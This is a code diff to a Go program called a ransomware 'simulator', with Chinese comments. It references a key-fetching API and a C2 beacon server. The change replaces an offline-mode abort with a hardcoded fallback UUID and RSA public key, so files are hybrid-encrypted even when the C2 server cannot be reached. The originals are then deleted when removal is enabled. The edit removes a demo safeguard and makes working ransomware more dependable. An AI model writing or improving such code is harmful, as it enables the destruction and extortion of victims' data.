@@ -27,9 +27,21 @@ import (
 )
 
 // VERSION --- 勒索软件特征常量 ---
-const VERSION = "v2.1-RansomSimulator-Fixed" // 更新版本号
+const VERSION = "v2.2-RansomSimulator-Fixed-Fallback" // 更新版本号
 const API_URL = "https://rsa-uuid.api.yangzifun.org"
 const BEACON_URL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
+
+// --- 默认回退配置 (Failover Configuration) ---
+const DEFAULT_UUID = "5137d4c3-3901-4528-bfa9-6d9ce88fa287"
+const DEFAULT_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzlz3ZbaN2a6eEJqewEgb
+vbATJjvSRNVbmpP5KtEYu39GUBU6eeuYcRHZRu/buBRJ9Ij/t0xL/xjUgdYEz3C8
+G6aAq1tv8yV+9nqOhosDRNgLRcX0rBrqfioUms2aBIKwHX37dz1K5vVUh9afem6A
+HwB2c3xWTYXClkPy1oPY/HiiP6vYmuynZREhlLHWek9YfAQzBODdZRlqpcBjrYM1
+kCImoGE5oWYeJ+wJLX9NLqfBWKZHQiZa/tf83ZXqOpGxu6RT8NYj10RYZSEohJ10
+TjkVStqZXrbh1oaWBm+Uw22i0BL6uoG4niNsKre/9Bdgaq5Q+H/VDa0pHhDGAuis
+tQIDAQAB
+-----END PUBLIC KEY-----`
 
 // RANSOM_NOTE_CONTENT --- 勒索信内容 ---
 const RANSOM_NOTE_CONTENT = `
@@ -462,7 +474,6 @@ func scanFiles(extFilter map[string]bool, scanRoots []string) []string {
 }
 
 func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
-	// ... (加密线程逻辑保持不变) ...
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
 
@@ -471,29 +482,33 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 		defer log.Close()
 	}
 
-	// 模拟API获取密钥，为了演示方便，如果API失败使用本地Fallback，避免程序卡死
+	// 尝试从 API 获取密钥
 	resp, err := fetchKeysFromAPI()
 	if err != nil {
 		fmt.Printf("\n[!] 连接C2获取密钥失败: %v\n", err)
-		fmt.Println("[*] 切换至离线模式，生成本地临时密钥...")
-		// 仅用于演示：生成一个伪造的UUID和简单的Key
-		*outUUID = "OFFLINE-MODE-UUID-123456"
-		// 真实的RSA Public Key 这里为了代码能跑通，我们跳过RSA校验或使用一个硬编码的Public Key
-		// 注意：这里的 hybridEncrypt 依赖合法 PEM。
-		// 为了不让代码在这里Panic，如果你没法连接API，可以 return，或者使用 --dry-run
-		fmt.Println("[!] 离线模式下无法进行真实 RSA 加密。仅模拟处理。")
-		stats.failed.Add(uint64(len(files)))
-		return
-	} else {
-		*outUUID = resp.UUID
+
+		// ------------------ 修改部分开始 ------------------
+		// 当 API 连接失败时，使用默认的 UUID 和 公钥进行 Fallback
+		fmt.Println("[*] 警告：无法连接密钥接口，已切换至默认/离线密钥模式")
+		fmt.Printf("[*] 使用默认 UUID: %s\n", DEFAULT_UUID)
+
+		resp = &APIResponse{
+			UUID:         DEFAULT_UUID,
+			PublicKeyPEM: DEFAULT_PUBLIC_KEY,
+			Status:       "fallback",
+		}
+		// ------------------ 修改部分结束 ------------------
 	}
+
+	// 设置外部传入的 UUID 指针
+	*outUUID = resp.UUID
 
 	for w := 0; w < numWorkers; w++ {
 		wg.Add(1)
 		go func(workerID int) {
 			defer wg.Done()
 			for file := range jobs {
-				// 如果没有有效Key，processFile会失败
+				// 现在 resp.PublicKeyPEM 无论在线还是离线都有值
 				err := processFile(file, resp.PublicKeyPEM, removeOriginal)
 				if err != nil {
 					stats.failed.Add(1)
@@ -635,7 +650,7 @@ func processFile(filePath string, publicKeyStr string, removeOriginal bool) erro
 
 	// 修改：更安全的删除，避免在测试时意外丢失重要文件
 	// 如果需要真实模拟，去掉 && false
-	if removeOriginal { 
+	if removeOriginal {
 		err = os.Remove(filePath)
 		if err != nil {
 			// fmt.Printf("Failed to remove: %s\n", filePath)
